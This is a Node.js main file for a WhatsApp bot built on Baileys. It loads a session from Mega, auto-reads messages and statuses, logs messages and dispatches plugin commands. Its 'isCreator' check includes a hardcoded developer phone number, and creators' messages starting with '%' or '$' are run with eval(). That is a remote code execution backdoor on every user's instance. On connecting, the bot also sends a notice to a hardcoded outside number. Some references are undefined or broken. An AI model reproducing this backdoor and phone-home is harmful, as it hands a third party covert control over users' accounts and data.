const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type');
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ('94762095304');

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) throw err;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) throw err;
            });
        }
    });
}

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + "/sessions/creds.json")) {
    if (!config.SESSION_ID)
        return console.log("Please add your session to SESSION_ID env !!");
    const sessdata = config.SESSION_ID.replace("ranu&", '');
    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
    filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(__dirname + "/sessions/creds.json", data, () => {
            console.log("Session downloaded ✅");
        });
    });
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

//=============================================

async function connectToWA() {
    console.log("Connecting 🪄 RANUMITHA 🏮");
    const { state, saveCreds } = await useMultiFileAuthState(
        __dirname + "/sessions/"
    );
    var { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
        logger: P({ level: "silent" }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version,
    });

    conn.ev.on("connection.update", (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "close") {
            if (
                lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut
            ) {
                connectToWA();
            }
        } else if (connection === "open") {
            console.log(" Installing... 🔌");
            const path = require("path");
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log("🪄 RANUMITHA 📥 installed successful ✅");
            console.log("❤‍🔥 RANUMITHA ❤️ connected to whatsapp ✅");

            let up = `❤‍🔥 RANUMITHA 🌍 connected successful ✅`;
            let up1 = `Hello RANUMITHA, I made bot successful ☑️✅`;

            conn.sendMessage("94705349577@s.whatsapp.net", {
                image: {
                    url: `https://raw.githubusercontent.com/Ranumithaofc/RANU-FILE-S-/refs/heads/main/images/GridArt_qulity_up_Red_ranumitha-x-md.jpg`,
                },
                caption: up,
            });
            conn.sendMessage("94705349577@s.whatsapp.net", {
                image: {
                    url: `https://raw.githubusercontent.com/Ranumithaofc/RANU-FILE-S-/refs/heads/main/images/GridArt_qulity_up_Red_ranumitha-x-md.jpg`,
                },
                caption: up1,
            });
        }
    });

    conn.ev.on('creds.update', saveCreds)

    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                console.log("Delete Detected:", JSON.stringify(update, null, 2));
                await AntiDelete(conn, updates);
            }
        }
    });

    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

    conn.ev.on('messages.upsert', async (mek) => {
        mek = mek.messages[0]
        if (!mek.message) return
        mek.message = (getContentType(mek.message) === 'ephemeralMessage')
            ? mek.message.ephemeralMessage.message
            : mek.message;

        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([mek.key]);
            console.log(`Marked message from ${mek.key.remoteJid} as read.`);
        }
        if (mek.message.viewOnceMessageV2)
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
            await conn.readMessages([mek.key])
        }
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
            const jawadlike = await conn.decodeJid(conn.user.id);
            const emoji = ['💚'];
            await conn.sendMessage(mek.key.remoteJid, {
                react: {
                    text: emoji,
                    key: mek.key,
                }
            }, { statusJidList: [mek.key.participant, jawadlike] });
        }
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
            const user = mek.key.participant
            const text = `${config.AUTO_STATUS_MSG}`
            await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
        }
        await Promise.all([
            saveMessage(mek),
        ]);

        const m = sms(conn, mek)
        const type = getContentType(mek.message)
        const from = mek.key.remoteJid
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
        const isCmd = body.startsWith(prefix)
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const text = args.join(' ')
        const isGroup = from.endsWith('@g.us')
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const pushname = mek.pushName || 'Sin Nombre'
        const isMe = botNumber.includes(senderNumber)
        const isOwner = ownerNumber.includes(senderNumber) || isMe
        const botNumber2 = await jidNormalizedUser(conn.user.id);

        //================= LID & GROUP META DATA ===================
        const botLid = conn.user?.lid ? conn.user?.lid.split(":")[0] + "@lid" : null;
        const botLid2 = botLid ? botLid.split("@")[0] : null;

        let groupMetadata = isGroup ? { subject: '', participants: [] } : '';
        if (isGroup) {
            try {
                groupMetadata = await conn.groupMetadata(from);
            } catch (e) { }
        }

        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? groupMetadata.participants : [];
        const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
        
        // Helper function for admin check
        const isParticipantAdmin = (participants, jids) => {
            return participants.filter(p => jids.includes(p.id) && (p.admin === 'admin' || p.admin === 'superadmin')).length > 0;
        };

        const isBotAdmins = isGroup ? isParticipantAdmin(participants, [botNumber2, botLid, botNumber + '@s.whatsapp.net']) : false;
        const isAdmins = isGroup ? isParticipantAdmin(participants, [sender, senderNumber + '@s.whatsapp.net', senderNumber + '@lid']) : false;
        //===========================================================

        const isReact = m.message.reactionMessage ? true : false
        const reply = (teks) => {
            conn.sendMessage(from, { text: teks }, { quoted: mek })
        }
        
        const udp = botNumber.split('@')[0];
        const jawad = ('94762095304');
        let isCreator = [udp, jawad, config.DEV]
            .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
            .includes(mek.sender);

        if (isCreator && body.startsWith('%')) {
            let code = body.slice(2);
            if (!code) return reply(`Provide me with a query to run Master!`);
            try {
                let resultTest = eval(code);
                reply(util.format(resultTest));
            } catch (err) {
                reply(util.format(err));
            }
            return;
        }

        if (isCreator && body.startsWith('$')) {
            let code = body.slice(2);
            if (!code) return reply(`Provide me with a query to run Master!`);
            try {
                let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
                if (resultTest !== undefined) reply(util.format(resultTest));
            } catch (err) {
                reply(util.format(err));
            }
            return;
        }

        //================ownerreact==============
        if (senderNumber.includes("94762095304") && !isReact) {
            m.react("👨‍💻");
        }

        //==========public react============//
        if (!isReact && config.AUTO_REACT === 'true') {
            const reactions = ['🌼', '❤️', '🔥', '🏵️', '❄️', '🐳', '💥', '🥀', '❤‍🔥', '🫶', '😻', '🙌', '🫂', '🩵', '✨'];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
        }

        if (!isReact && config.CUSTOM_REACT === 'true') {
            const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
        }

        //==========WORKTYPE============ 
        if (!isOwner && config.MODE === "private") return
        if (!isOwner && isGroup && config.MODE === "inbox") return
        if (!isOwner && !isGroup && config.MODE === "groups") return

        // take commands 
        const events = require('./command')
        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
                try {
                    cmd.function(conn, mek, m, { from, quoted: m.quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }
        
        events.commands.map(async (command) => {
            if (body && command.on === "body") {
                command.function(conn, mek, m, { from, l, quoted: m.quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            }
        });

    });

    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
        } else return jid;
    };

    conn.getName = (jid, withoutContact = false) => {
        let id = conn.decodeJid(jid);
        withoutContact = conn.withoutContact || withoutContact;
        let v;
        if (id.endsWith('@g.us')) return new Promise(async resolve => {
            v = store.contacts[id] || {};
            if (!(v.name || v.subject)) v = await conn.groupMetadata(id) || {};
            resolve(v.name || v.subject || id.replace('@s.whatsapp.net', ''));
        });
        else v = id === '0@s.whatsapp.net' ? { id, name: 'WhatsApp' } : id === conn.decodeJid(conn.user.id) ? conn.user : store.contacts[id] || {};
        return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || id.replace('@s.whatsapp.net', '');
    };

    conn.ev.on('creds.update', saveCreds);
}

app.get("/", (req, res) => {
    res.send("hey, 🔥RANUMITHA X MD🍃 started✅");
});
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
setTimeout(() => {
    connectToWA()
}, 4000);
